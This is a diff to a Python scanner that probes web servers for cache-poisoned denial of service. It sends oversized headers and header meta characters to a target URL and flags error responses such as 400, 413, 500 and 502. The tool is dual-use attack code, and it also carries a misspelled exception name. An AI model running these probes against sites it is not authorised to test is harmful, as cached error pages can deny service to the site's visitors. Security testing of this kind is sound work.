@@ -11,10 +11,15 @@ def HHO(url, s, main_status_code, authent):
     max_i = 20
     i = 0
     while i < max_i:
-        h = {"X-Oversized-Header-{}".format(i):"Big-Value-00000000000000000000000000000000000000000000000000000000000000000000"}
+        big_value = """Big-Value-0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""
+        h = {"X-Oversized-Header-{}".format(i):"{}".format(big_value)}
         try:
             req_hho = s.get(url, headers=h, auth=authent)
-            if req_hho.status_code in [400, 413, 500] and req_hho.status_code != main_status_code:
+            #print(req_hho.status_code)
+            #print(h)
+            if req_hho.status_code in [400, 413, 500, 502] and req_hho.status_code != main_status_code:
                 print(h)
                 print(url)
                 print(req_hho.status_code)
@@ -25,8 +30,8 @@ def HHO(url, s, main_status_code, authent):
         except KeyboardIntercupt:
             pass
         except:
+            traceback.print_exc()
             pass
-            #print("plop")
     if cpdos_win:
         print("   └── \033[31m{} CPDos HHO seem work !\033[0m".format(url))
 
@@ -40,7 +45,6 @@ def HMC(url, s, main_status_code, authent):
             req_verify_hmc = s.get(url, verify=False, timeout=10, auth=authent)
             if req_verify_hmc.status_code == req_hmc.status_code:
                 print("   └── \033[31m CPDos HMC on {} seem work with {} payload header ! \033[0m".format(url, headers))
-
 
 
 def HMO(url, s, main_status_code, authent):
